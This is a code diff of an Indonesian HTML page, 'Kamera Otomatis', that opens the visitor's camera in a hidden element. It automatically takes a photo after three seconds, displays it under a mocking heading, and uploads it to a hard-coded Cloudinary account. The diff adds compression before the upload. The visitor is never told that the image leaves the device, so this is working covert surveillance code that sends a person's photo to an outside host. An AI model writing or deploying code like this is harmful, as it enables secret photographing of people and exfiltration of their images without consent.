@@ -5,15 +5,40 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Kamera Otomatis</title>
     <style>
-        body { text-align: center; font-family: Arial, sans-serif; }
-        #preview { margin-top: 20px; border: 2px solid black; width: 300px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            background: #f0f0f0; 
+            font-family: Arial, sans-serif; 
+            flex-direction: column;
+        }
+        .container {
+            text-align: center;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
+        }
+        h1 { margin-bottom: 15px; }
+        #preview {
+            margin-top: 15px;
+            width: 300px; 
+            height: auto; 
+            border-radius: 10px;
+            border: 2px solid black;
+        }
     </style>
 </head>
 <body>
-    <h1>ORANG GILA :</h1>
-    <video id="camera" autoplay playsinline style="display: none;"></video>
-    <canvas id="canvas" style="display: none;"></canvas>
-    <img id="preview" alt="Foto akan muncul di sini">
+    <div class="container">
+        <h1>ORANG GILA :</h1>
+        <video id="camera" autoplay playsinline style="display: none;"></video>
+        <canvas id="canvas" style="display: none;"></canvas>
+        <img id="preview">
+    </div>
 
     <script>
         const video = document.getElementById('camera');
@@ -32,27 +57,28 @@
         // 2. AMBIL FOTO OTOMATIS SETELAH 3 DETIK
         setTimeout(() => {
             console.log("Mengambil foto...");
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
+            canvas.width = 600;  // Ukuran lebih kecil untuk kompresi
+            canvas.height = 800;
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            let imageData = canvas.toDataURL("image/png");
 
-            preview.src = imageData;
+            preview.src = canvas.toDataURL("image/jpeg", 0.6);  // Kompres ke JPEG 60%
             console.log("Foto berhasil diambil.");
 
-            // 3. UPLOAD KE CLOUDINARY
-            uploadToCloudinary(imageData);
+            // 3. KOMPREESI FOTO SEBELUM UPLOAD
+            canvas.toBlob(blob => {
+                uploadToCloudinary(blob);
+            }, "image/jpeg", 0.6);
         }, 3000);
 
         // 4. FUNGSI UPLOAD KE CLOUDINARY
-        function uploadToCloudinary(imageData) {
+        function uploadToCloudinary(imageBlob) {
             let cloudName = "dl5dswv7q";  // Ganti dengan Cloud Name kamu
             let uploadPreset = "tikontol";  // Ganti dengan Upload Preset kamu
 
             console.log("Mengunggah foto ke Cloudinary...");
             
             let formData = new FormData();
-            formData.append("file", imageData);
+            formData.append("file", imageBlob);
             formData.append("upload_preset", uploadPreset);
 
             fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
